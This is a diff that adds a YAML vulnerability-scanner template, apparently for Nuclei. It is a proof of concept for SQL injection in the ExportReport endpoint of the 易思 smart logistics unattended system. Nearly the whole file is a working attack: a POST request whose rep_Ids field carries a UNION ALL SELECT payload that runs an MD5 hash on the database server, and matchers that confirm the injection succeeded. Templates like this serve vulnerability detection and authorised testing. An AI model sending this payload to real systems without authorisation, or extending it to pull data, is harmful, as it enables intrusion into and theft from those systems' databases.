@@ -1,0 +1,32 @@
+id: poc-yaml-eosine-exportreport-sqli
+info:
+  name: 易思智能物流无人值守系统 ExportReport SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    易思智能物流无人值守系统 ExportReport endpoint is vulnerable to SQL Injection, allowing execution of arbitrary SQL queries.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/Sys_ReportFile/ExportReport"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "rep_Ids=1%27%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2Csys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+CdNX"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "0x{{t2}}"
+          - "转换成数据类型"
+          - "resultdata"
